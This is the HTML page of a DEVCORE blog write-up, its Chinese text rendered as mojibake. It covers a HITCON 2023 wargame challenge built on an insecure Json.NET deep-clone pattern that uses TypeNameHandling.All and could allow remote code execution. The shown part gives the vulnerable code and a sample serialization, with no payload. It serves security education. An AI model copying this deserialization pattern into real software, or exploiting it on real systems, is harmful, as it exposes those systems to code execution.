

<!DOCTYPE html>
<html class="no-js sub-menu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8" />
    <link href="/images/favicon.png" rel="icon" size="32x32">
    <!-- web fullscreen -->
    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
    <meta name="format-detection" content="telephone=no">
    <title>HITCON 2023 x DEVCORE Wargame: My todolist Write-up | DEVCORE æˆ´å¤«å¯‡çˆ¾</title>
    <link rel="stylesheet" href="/css/style.css" />
    <script src="/js/modernizr-custom.js"></script>
    <script src="/js/jquery-3.6.0.min.js"></script>
    <script src="/js/site.js"></script>
    <meta name="description" property="og:description" content="HITCON 2023 x DEVCORE Wargame æœ€é«˜åˆ†é¡Œ My todolist å‡ºé¡Œæ¦‚å¿µåŠè§£ç­”ã€‚å¾çµè«–è€Œè¨€ï¼Œé€™æ˜¯ä¸€å€‹ç°¡å–®çš„ Json.NET ååºåˆ—åŒ–æ¼æ´çš„ç™½ç®±é¡Œç›®..." />
    <meta name="keywords" content="HITCON 2023, DEVCORE Wargame, MetadataPropertyHandling, Write-up, Deserialize" />
    <meta property="og:site_name" content="DEVCORE æˆ´å¤«å¯‡çˆ¾" />
    <meta property="og:title" content="HITCON 2023 x DEVCORE Wargame: My todolist Write-up | DEVCORE æˆ´å¤«å¯‡çˆ¾" />
    <meta property="og:url" content="https://devco.re/blog/2023/09/18/hitcon-2023-devcore-wargame-my-todolist-writeup/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20230918/cover.png" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="HITCON 2023 x DEVCORE Wargame: My todolist Write-up | DEVCORE æˆ´å¤«å¯‡çˆ¾">
    <meta name="twitter:description" content="HITCON 2023 x DEVCORE Wargame æœ€é«˜åˆ†é¡Œ My todolist å‡ºé¡Œæ¦‚å¿µåŠè§£ç­”ã€‚å¾çµè«–è€Œè¨€ï¼Œé€™æ˜¯ä¸€å€‹ç°¡å–®çš„ Json.NET ååºåˆ—åŒ–æ¼æ´çš„ç™½ç®±é¡Œç›®...">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20230918/cover.png">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2023/09/18/hitcon-2023-devcore-wargame-my-todolist-writeup/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE æˆ´å¤«å¯‡çˆ¾" href="https://devco.re/rss">

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-GHXJ9PS005');
    </script>
    <link rel="stylesheet" href="/fonts/inter.css" />
    <link rel="stylesheet" href="/css/highlighter.css" />
    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
</head>
<body>
    <!-- å°è¦½åˆ— start -->
    <header class="header">
<div class="container">
    <!-- logo start -->
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
    </div>
    <!-- logo end -->
    <!-- ä¸»é¸å–® start -->
    <nav class="nav">
        <ul class="menu">
            <li class="dropdown">
                <div class="menuLable">
                    <span>æœå‹™<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/services/red-team/">
                            <div class="item">

                                <h2>
                                    <i class="icon menu service-red-team"></i>
                                    ç´…éšŠæ¼”ç·´
                                </h2>
                                <p class="two-line">
                                    åœ¨ä¸å½±éŸ¿ä¼æ¥­ç‡Ÿé‹å‰æä¸‹ï¼Œç„¡æ‰€ä¸ç”¨å…¶æ¥µï¼Œå¾å„ç¨®é€²å…¥é»åŸ·è¡Œæ¨¡æ“¬å…¥ä¾µæ”»æ“Šï¼Œé”æˆä¼æ¥­æŒ‡å®šçš„æ¼”ç·´æƒ…å¢ƒã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/services/penetration-test/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-penetration-test"></i>
                                    æ»²é€æ¸¬è©¦
                                </h2>
                                <p class="two-line">
                                    ä»¥é§­å®¢æ€ç¶­åŠæ‰‹æ³•å˜—è©¦å…¥ä¾µä¼æ¥­æŒ‡å®šç³»çµ±ï¼Œæ‰¾å‡ºæ½›åœ¨æ¼æ´ï¼Œé©—è­‰ä¼æ¥­è³‡æ–™èˆ‡è¨­å‚™æ˜¯å¦å¯è¢«ç«Šå–æˆ–ç ´å£ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-consulting/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-consulting"></i>
                                    è³‡å®‰é¡§å•æœå‹™
                                </h2>
                                <p class="two-line">
                                    ä»¥ç´…éšŠæ¼”ç·´ç‚ºåŸºç¤ï¼Œæä¾›æ”»æ“Šè€…è¦–è§’èˆ‡å¯èƒ½å…¥ä¾µè·¯å¾‘ï¼Œå”åŠ©ä¼æ¥­è©•ä¼°è³‡å®‰è³‡æºå„ªå…ˆé †åºï¼Œä¸¦æ“¬å®šé•·æœŸé˜²ç¦¦ç­–ç•¥ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-training/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-training"></i>
                                    è³‡å®‰æ•™è‚²è¨“ç·´
                                </h2>
                                <p class="two-line">
                                    å¾æ”»æ“Šæ€ç¶­å‡ºç™¼ï¼Œå”åŠ©ä¼æ¥­æœ‰æ•ˆé é˜²è³‡å®‰äº‹æ•…ä¸¦é˜²ç¦¦ï¼›ä»¥åŠäº‹ä»¶ç™¼ç”Ÿæ™‚ï¼Œå¦‚ä½•å¿«é€Ÿåˆ¤å®šæ”»æ“Šç›®çš„ã€æ‰‹æ³•ã€æ¼æ´èˆ‡åŠæ‡‰è®Šæ–¹å¼ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="https://training.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu offsec"></i>
                                    OffSec é§­å®¢æŠ€è¡“èª²ç¨‹ <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    æ”œæ‰‹å…¨çƒç¶²è·¯å®‰å…¨åŸ¹è¨“åŠèªè­‰å•† OffSecï¼Œé€é Live Training åŸå» è¬›å¸«å¯¦é«”æˆèª²åŠç·šä¸Šèª²ç¨‹çš„çµæ§‹åŒ–å­¸ç¿’è³‡æºï¼Œè®“è³‡å®‰äººå“¡çš„ç¶²è·¯å®‰å…¨æ”»æ“ŠæŠ€è¡“èˆ‡æ™‚ä¿±é€²ã€‚
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>

            <li class="dropdown">
                <div class="menuLable">
                    <span>ç ”ç©¶<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/research/overview/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu search-circle"></i>
                                    ç¸½è¦½æ¦‚è¦
                                </h2>
                                <p class="two-line">
                                    æŒçºŒç²¾ç ”è³‡å®‰æœ€æ–°æŠ€è¡“åŠæ¼æ´ç ”ç©¶è¶¨å‹¢ï¼Œå…¨æ–¹ä½æª¢æ¸¬ä¼æ¥­ç”¢å“å®‰å…¨æ€§ã€å¸å–ç¶“é©—ä¸¦è½‰åŒ–ç‚ºç´…éšŠæ¼”ç·´å·¥å…·èˆ‡æ‰‹æ³•ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/research/awards/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu badge-check"></i>
                                    ç«¶è³½èˆ‡çé …
                                </h2>
                                <p class="two-line">
                                    åœ‹éš›ç´šè³‡è¨Šå®‰å…¨ç«¶è³½çé …è‚¯å®šã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/research/bug-bounty/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu puzzle"></i>
                                    ä¼æ¥­æ¼æ´å›å ±
                                </h2>
                                <p class="two-line">
                                    ç ”ç©¶ä¼æ¥­ç³»çµ±ä¸­çš„è³‡å®‰é¢¨éšªåŠå„ç¨®å¯èƒ½çš„çªç ´å£ï¼Œä¸¦é€šå ±ä¼æ¥­ä¿®è£œã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/research/talks/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu globe"></i>
                                    åœ‹éš›ç ”è¨æœƒ
                                </h2>
                                <p class="two-line">
                                    åƒèˆ‡å…¨çƒè³‡å®‰ç››æœƒï¼Œç™¼è¡¨ã€äº¤æµæ¼æ´çš„çŸ¥è­˜èˆ‡è³‡è¨Šã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/research/cve/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu view-list"></i>
                                    CVE æ¼æ´åˆ—è¡¨
                                </h2>
                                <p class="two-line">
                                    æŒ–æ˜ä¸¦å›å ±åœ‹éš›çŸ¥åç”¢å“èˆ‡æœå‹™çš„é‡å¤§æ¼æ´ã€‚
                                </p>
                            </div>
                        </a>
                    </div>
                </div>


            </li>

            <li class="dropdown">
                <div class="menuLable" href="#">
                    <span>å…¬å¸<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/company/about/">
                        <div class="item">
                            <h2>
                                <i class="icon menu company"></i>
                                å…¬å¸ç°¡ä»‹
                            </h2>
                            <p>
                                DEVCORE æˆ´å¤«å¯‡çˆ¾ç”±ä¸–ç•Œç´šç™½å¸½é§­å®¢åœ˜éšŠå‰µç«‹ï¼Œæä¾›ç´…éšŠæ¼”ç·´ã€æ»²é€æ¸¬è©¦ã€è³‡å®‰é¡§å•æœå‹™ã€è³‡å®‰æ•™è‚²è¨“ç·´ç­‰æœå‹™ã€‚
                            </p>
                        </div>
                        </a>
                        <a href="/company/our-team/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu team"></i>
                                    åœ˜éšŠæˆå“¡
                                </h2>
                                <p class="two-line">
                                    ç”±ç†±è¡·æŒ‘æˆ°ã€å…·å‚™é§­å®¢æ€ç¶­çš„è³‡å®‰å°ˆå®¶çµ„æˆï¼Œå°ˆæ³¨æ–¼å‰µæ–°æ”»æ“Šæ‰‹æ³•ç ”ç©¶ï¼Œä¸¦ä»¥ã€Œé«˜é“å¾·ã€é«˜è‡ªå¾‹ã€é«˜åš´è¬¹ã€ç‚ºæœ€é«˜æŒ‡å°åŸå‰‡ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/company/history/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu milestone"></i>
                                    æˆå°±èˆ‡æ²¿é©
                                </h2>
                                <p class="two-line">
                                    é•·æœŸèšç„¦æ–¼æ”»æ“Šç ”ç©¶ï¼Œå±¢å±¢ç²é‚€åƒèˆ‡å…¨çƒçŸ¥åè³‡å®‰ç ”è¨æœƒï¼Œå·²æ­éœ²æ•¸ç™¾å€‹é‡è¦ç”¢å“æ¼æ´ã€å”åŠ©ä¼æ¥­æå‡é˜²ç¦¦èƒ½é‡ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/company/csr/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu heart"></i>
                                    ä¼æ¥­ç¤¾æœƒè²¬ä»»
                                </h2>
                                <p class="two-line">
                                    æä¾›å¤šå…ƒå¯¦ç¿’ç®¡é“å’Œç ”ç¿’è¨ˆç•«ï¼Œæå‡æ–°ä¸–ä»£äººæ‰è³‡å®‰èƒ½é‡ï¼Œæ¨å»£è³‡è¨Šå®‰å…¨æ„è­˜ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/company/jobs/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu briefcase"></i>
                                    å·¥ä½œæ©Ÿæœƒ
                                </h2>
                                <p class="two-line">
                                    åŠ å…¥ DEVCOREï¼Œå…±åŒæ”¹å–„è³‡å®‰ç”¢æ¥­çµæ§‹ï¼Œèˆ‡æˆ‘å€‘ä¸€èµ·æ‰“é€ æ›´å®‰å…¨çš„ä¸–ç•Œã€‚
                                </p>
                            </div>
                        </a>
                        <a href="https://conf.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu conference"></i>
                                    æ”»æ“Šå°å‘æŠ€è¡“ç ”è¨æœƒ <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    ç”± DEVCORE èˆ‰è¾¦çš„æŠ€è¡“ç ”è¨æœƒï¼Œèšç„¦æ–¼æŠ€è¡“ä¸¦ç”±é§­å®¢è¦–è§’å‡ºç™¼ï¼Œå¸¶æ‚¨æ¢ç´¢å‰µæ–°çš„æ”»æ“ŠæŠ€è¡“èˆ‡æ‰‹æ³•ï¼Œå¾æ”»æ“Šæ€è€ƒé˜²ç¦¦çš„ç­–ç•¥ã€‚
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li class="dropdown">
                <div class="menuLable">
                    <span>æ–°è<i class="icon arrow_down"></i></span>
                    <div class="menuItem">
                        <a href="/blog/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu newspaper"></i>
                                    BLOG
                                </h2>
                                <p>
                                    DEVCORE æœ€æ–°æ¶ˆæ¯ã€‚
                                </p>
                            </div>
                        </a>
                        <a href="/media-kit/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu download"></i>
                                    åª’é«”ç´ æä¸‹è¼‰
                                </h2>
                                <p>
                                    ä½¿ç”¨ DEVCORE å•†æ¨™é ˆéµå¾ªçš„ä½¿ç”¨è¦ç¯„ã€‚
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li>
                <a class="menuLable" href="/search/">æœå°‹</a>
            </li>
            <li>
                <a class="menuLable" href="/contact/">è¯çµ¡æˆ‘å€‘</a>
            </li>
        </ul>
    </nav>
    <!-- ä¸»é¸å–® end -->
</div>


<!-- æ‰‹æ©Ÿæ¿é¸å–®  start-->
<nav class="nav-m" id="menu-m">
    <ul class="menu">
        <li>
            <div class="menuLable">
                <span>æœå‹™</span>
                <div class="menuItem">
                    <a href="/services/red-team/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-red-team"></i>
                                ç´…éšŠæ¼”ç·´
                            </h2>
                        </div>
                    </a>
                    <a href="/services/penetration-test/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-penetration-test"></i>
                                æ»²é€æ¸¬è©¦
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-consulting/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-consulting"></i>
                                é¡§å•æœå‹™
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-training/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-training"></i>
                                æ•™è‚²è¨“ç·´
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>è³‡å®‰ç ”ç©¶</span>
                <div class="menuItem">
                    <a href="/research/overview/" class="fullwidth">
                        <div class="item">
                            <h2>ç¸½è¦½æ¦‚è¦</h2>
                        </div>
                    </a>
                    <a href="/research/awards/">
                        <div class="item">
                            <h2>ç«¶è³½èˆ‡çé …</h2>
                        </div>
                    </a>
                    <a href="/research/bug-bounty/">
                        <div class="item">
                            <h2>Bug Bounty</h2>
                        </div>
                    </a>
                    <a href="/research/talks/">
                        <div class="item">
                            <h2>åœ‹éš›ç ”è¨æœƒ</h2>
                        </div>
                    </a>
                    <a href="/research/cve/">
                        <div class="item">
                            <h2>CVE æ¼æ´åˆ—è¡¨</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>

        <li>
            <div class="menuLable">
                <span>å…¬å¸</span>
                <div class="menuItem">
                    <a href="/company/about/" class="fullwidth">
                        <div class="item">
                            <h2>å…¬å¸ç°¡ä»‹</h2>
                        </div>
                    </a>
                    <a href="/company/our-team/">
                        <div class="item">
                            <h2>åœ˜éšŠæˆå“¡</h2>
                        </div>
                    </a>
                    <a href="/company/history/">
                        <div class="item">
                            <h2>æˆå°±èˆ‡æ²¿é©</h2>
                        </div>
                    </a>
                    <a href="/company/csr/">
                        <div class="item">
                            <h2>ä¼æ¥­ç¤¾æœƒè²¬ä»»</h2>
                        </div>
                    </a>
                    <a href="/company/jobs/">
                        <div class="item">
                            <h2>å·¥ä½œæ©Ÿæœƒ</h2>
                        </div>
                    </a>
                    <a href="https://conf.devco.re/" target="_blank">
                        <div class="item">
                            <h2>DEVCORE CONFERENCE</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>æ–°è</span>
                <div class="menuItem">
                    <!-- <a href="/blog/">
                    <div class="item">
                        <h2>æ‰€æœ‰æ–‡ç« </h2>
                    </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>æ¡ˆä¾‹å‰–æ</h2>
                        </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>ç§‘æ™®æ–‡ç« </h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>æŠ€è¡“å°ˆæ¬„</h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>è³‡å®‰æ–°è</h2>
                        </div>
                    </a> -->
                    <a href="/blog/">
                        <div class="item">
                            <h2>BLOG</h2>
                        </div>
                    </a>
                    <a href="/media-kit/">
                        <div class="item">
                            <h2>åª’é«”ç´ æä¸‹è¼‰</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <div class="menuItem">
                    <a href="/search/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon search"></i>
                                æœå°‹
                            </h2>
                        </div>
                    </a>
                    <a href="/contact/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon chat-alt"></i>
                                è¯çµ¡æˆ‘å€‘
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span><i class="icon translate"></i>Language</span>
                <div class="menuItem">
                    <a href="/">
                    <div class="item">
                        <h2>ä¸­æ–‡</h2>
                    </div>
                    </a>
                    <a href="/en">
                        <div class="item">
                            <h2>English</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
    </ul>
</nav>
<!-- æ‰‹æ©Ÿæ¿é¸å–®  end-->
    </header>
    <!-- å°è¦½åˆ— end -->

    <!-- tab é¸å–® start -->
    <div class="sub-nav">
        <div class="container">
            <h1>BLOG</h1>
            <ul class="tab">
                <li>
                    <a href="/blog/">æ‰€æœ‰æ–‡ç« </a>
                </li>
                <li>
                    <a href="/blog/category/æœ€æ–°æ¶ˆæ¯/">æœ€æ–°æ¶ˆæ¯</a>
                </li>
                <li>
                    <a href="/blog/category/æŠ€è¡“å°ˆæ¬„/">æŠ€è¡“å°ˆæ¬„</a>
                </li>
                <li>
                    <a href="/blog/category/ç§‘æ™®æ–‡ç« /">ç§‘æ™®æ–‡ç« </a>
                </li>
                <li>
                    <a href="/blog/category/è³‡å®‰æ–°è/">è³‡å®‰æ–°è</a>
                </li>
                <li>
                    <a href="/blog/category/å­¸ç”Ÿç›¸é—œè¨ˆåŠƒ/">å­¸ç”Ÿç›¸é—œè¨ˆåŠƒ</a>
                </li>
                <li>
                    <a href="/media-kit/">åª’é«”ç´ æä¸‹è¼‰</a>
                </li>
            </ul>
        </div>
    </div>
    <!-- tab é¸å–® end -->
    
    <div class="main">
        <!-- æ–‡ç« å¤–å±¤layer -->
        <section class="narrow">
            <!-- æ–‡ç«  start -->
            <article class="article_body">
                <div class="content">
                    <a class="category" href="/blog/category/æŠ€è¡“å°ˆæ¬„">æŠ€è¡“å°ˆæ¬„</a>
                    <span class="tag">

                      <a href="/blog/tag/Deserialize/">#Deserialize</a> <a href="/blog/tag/RCE/">#RCE</a> 
                    </span>
                    <h1>
                        HITCON 2023 x DEVCORE Wargame: My todolist Write-up
                    </h1>
                    
                    
                    <div class="author_detail">
                        <span class="avatar">
                            <a href="/blog/author/cyku">
                                <div class="circle">
                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/cyku.png');" ></i>
                                </div>
                            </a>
                        </span>
                        <span class="author"><a href="/blog/author/cyku">Cyku</a></span>
                        <span class="date">2023-09-18</span>
                    </div>
                    
                    
                    <div class="article_img">
                        <img src="https://devco.re/assets/img/blog/20230918/cover.png"/>
                    </div>
                    

                    <hr>

                    <!-- æ–‡ç« å…§å®¹ -->
                    <div class="article_content">
<p>ç‚ºäº† HITCON 2023 æ´»å‹•ï¼Œæˆ‘ä»Šå¹´ä¹Ÿåœ¨ DEVCORE æ”¤ä½ä¸Šæº–å‚™äº†ä¸‰é¡Œè¶£å‘³æ€§è³ªçš„ Wargame é¡Œç›®è®“åƒè³½è€…åœ¨è½å®Œè­°ç¨‹çš„ç©ºé–’ä¹‹é¤˜å¯ä»¥äº«å—ä¸€ä¸‹è¦ªè‡ªå‹•æ‰‹è§£é¡Œçš„å¿«æ¨‚ï¼Œè€Œé™¤äº†æˆ‘æ‰€æº–å‚™çš„é¡Œç›®ä»¥å¤–ï¼ŒåŒ…æ‹¬å…¶ä»–æ‰€æœ‰é¡Œç›®éƒ½å¯ä»¥åœ¨ä»¥ä¸‹çš„ GitHub repository è£¡æ‰¾åˆ°ï¼š<a href="https://github.com/DEVCORE-Wargame/HITCON-2023">https://github.com/DEVCORE-Wargame/HITCON-2023</a>ã€‚</p>

<p>é€™æ¬¡æº–å‚™çš„é¡Œç›®åˆ†åˆ¥æ˜¯ Whatâ€™s my IPã€Submit flag å’Œ My todolistã€‚ç¬¬ä¸€å€‹é¡Œç›® Whatâ€™s my IP åªè¦çœ‹ç¨‹å¼ç¢¼å°±æœƒçŸ¥é“æ˜¯å€‹ HTTP header å½é€  IP åŠ ä¸Š SQL Injectin åˆ©ç”¨çš„ç°¡å–®é¡Œï¼Œåªæ˜¯æ´»å‹•æœŸé–“åƒè³½è€…å€‘å¾—æ†‘è‘—ç¶“é©—èˆ‡é§­å®¢ç›´è¦ºä»¥é»‘ç®±æ–¹å¼æ‰¾å‡ºå¼±é»çš„å­˜åœ¨ã€‚ç¬¬äºŒå€‹é¡Œç›® Submit flag å°±æ˜¯ä¸€å€‹ç¶“å…¸çš„ Race Conditionï¼Œæ˜¯ä¸€å€‹è€æ¢—ä½†ä¹Ÿæ˜¯æ»²é€æ¸¬è©¦ä¸­ç¶“å¸¸è¢«å¿½ç•¥çš„ç´°ç¯€ï¼Œç‚ºäº†æé«˜æˆåŠŸç‡å¾è€Œé¿å…è®“åƒåŠ è€…æµªè²»å¤ªå¤šæ™‚é–“ï¼Œæˆ‘ç‰¹åœ°åœ¨ä¸­é–“æ’å…¥ä¸å¿…è¦çš„ sleepï¼Œé›–ç„¶å¯èƒ½è®“é¡Œç›®è®Šå¾—éæ–¼ç°¡å–®ï¼Œå¸Œæœ›è‡³å°‘èƒ½æé†’å¤§å®¶å›æƒ³èµ·é‚„å­˜åœ¨é€™ç¨®å¼±é»å°±å¤ªå¥½äº†ã€‚</p>

<p>æœ€å¾Œä¸€å€‹é¡Œç›®ä¹Ÿæ˜¯æœ¬ç¯‡æ–‡ç« æƒ³è¦å’Œå¤§å®¶åˆ†äº«çš„ä¸»é¡Œï¼šMy todolistã€‚å¾çµè«–è€Œè¨€ï¼Œé€™æ˜¯ä¸€å€‹ç°¡å–®çš„ Json.NET ååºåˆ—åŒ–æ¼æ´çš„ç™½ç®±é¡Œç›®ï¼Œå­˜åœ¨æ¼æ´çš„ä½ç½®æ˜¯åœ¨ç¨‹å¼ç¢¼ <a href="https://github.com/DEVCORE-Wargame/HITCON-2023/blob/main/challenges/web/My%20todolist/MyTodolist/MyTodolist/Extensions/WebExtension.cs#L20">Extensions/WebExtension.cs</a> çš„ç¬¬ 20 è¡Œï¼Œä½†æˆ‘æƒ³ç¨å¾®å’Œå¤§å®¶åˆ†äº«é¡Œç›®çš„ç”±ä¾†ã€‚</p>

<p>é¡Œç›®èµ·æºæ–¼æˆ‘æ›¾ç¶“åœ¨æŸäº›ç¨‹å¼ä¸­çœ‹éé¡ä¼¼ä»¥ä¸‹çš„ Deep Copy å¯¦ä½œï¼š</p>
<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">static</span> <span class="n">T</span> <span class="n">Clone</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;(</span><span class="k">this</span> <span class="n">T</span> <span class="n">source</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">JsonSerializerSettings</span> <span class="n">settings</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JsonSerializerSettings</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">TypeNameHandling</span> <span class="p">=</span> <span class="n">TypeNameHandling</span><span class="p">.</span><span class="n">All</span>
    <span class="p">};</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">T</span><span class="p">)</span> <span class="n">JsonConvert</span><span class="p">.</span><span class="nf">DeserializeObject</span><span class="p">(</span><span class="n">JsonConvert</span><span class="p">.</span><span class="nf">SerializeObject</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">settings</span><span class="p">),</span> <span class="n">settings</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>æˆ‘å€‘éƒ½çŸ¥é“ç•¶ DeserializeObject çš„ä¾†æºå­—ä¸²å¯ä»¥æ§åˆ¶ä¸¦ä¸”é–‹å•Ÿ TypeNameHandling æ™‚ï¼Œæˆ‘å€‘å¯ä»¥è¼•æ˜“åˆ©ç”¨ååºåˆ—åŒ–èƒ½åˆå§‹åŒ–ä»»æ„ç‰©ä»¶çš„ç‰¹æ€§åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼æˆ–ç³»çµ±æŒ‡ä»¤ï¼Œç„¶è€Œåœ¨ Deep Clone çš„ä½¿ç”¨æƒ…å¢ƒä¸‹ï¼Œä¾†æºå­—ä¸²æ˜¯ SerializeObject çš„è¼¸å‡ºçµæœï¼Œé€™ä»£è¡¨è‘—ä»»ä½•æ¨™è¨˜ç‰©ä»¶åç¨±çš„ $type å±¬æ€§ä¹Ÿæ˜¯ç”± Json.NET æ‰€æ§åˆ¶è€Œéç”±æˆ‘å€‘æ§åˆ¶ï¼Œæ‰€ä»¥é€™è¡¨ç¤ºé€™æ®µç¨‹å¼ç¢¼æ‡‰è©²æ˜¯ç„¡æ³•è¢«åˆ©ç”¨çš„æ‰å°ï¼Œé™¤éï¼Œè‹¥æˆ‘å€‘å¯ä»¥è¦†è“‹ $type å±¬æ€§çš„è©±å‘¢ï¼Ÿ</p>

<p>é€™å€‹ç–‘å•å‹¾èµ·äº†æˆ‘çš„å¥½å¥‡å¿ƒï¼Œå› æ­¤è®“æˆ‘æ±ºå®šé€²è¡Œä¸€äº›å˜—è©¦ï¼Œç•¶æˆ‘å˜—è©¦ç”¨ä»¥ä¸‹ç¨‹å¼ç¢¼åºåˆ—åŒ–ä¸€å€‹ Dictionary ç‰©ä»¶æ™‚ï¼Œæˆ‘å¾—åˆ°äº†ä¸€å€‹æœ‰è¶£çš„çµæœã€‚</p>
<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">,</span> <span class="kt">string</span><span class="p">&gt;</span> <span class="n">source</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">,</span> <span class="kt">string</span><span class="p">&gt;();</span>
<span class="n">source</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"key"</span><span class="p">,</span> <span class="s">"value"</span><span class="p">);</span>
<span class="n">JsonSerializerSettings</span> <span class="n">settings</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JsonSerializerSettings</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">TypeNameHandling</span> <span class="p">=</span> <span class="n">TypeNameHandling</span><span class="p">.</span><span class="n">All</span>
<span class="p">};</span>
<span class="kt">string</span> <span class="n">result</span> <span class="p">=</span> <span class="n">JsonConvert</span><span class="p">.</span><span class="nf">SerializeObject</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">settings</span><span class="p">);</span>
</code></pre></div></div>

<p>çµæœï¼š</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"$type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"key"</span><span class="p">:</span><span class="w"> </span><span class="s2">"value"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

